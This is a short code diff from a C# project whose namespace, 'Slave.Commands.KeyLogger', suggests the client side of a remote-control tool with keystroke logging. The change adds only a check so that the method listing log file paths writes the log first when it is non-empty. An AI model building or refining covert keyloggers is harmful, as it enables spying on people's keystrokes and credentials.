@@ -81,7 +81,7 @@ namespace Slave.Commands.KeyLogger
         /// <returns>List of log files name</returns>
         public List<string> GetLogFilesPath()
         {
-            LogInFile();
+            if(logs != "") LogInFile();
             return Directory.EnumerateFiles(logDirectory).ToList();
         }
 
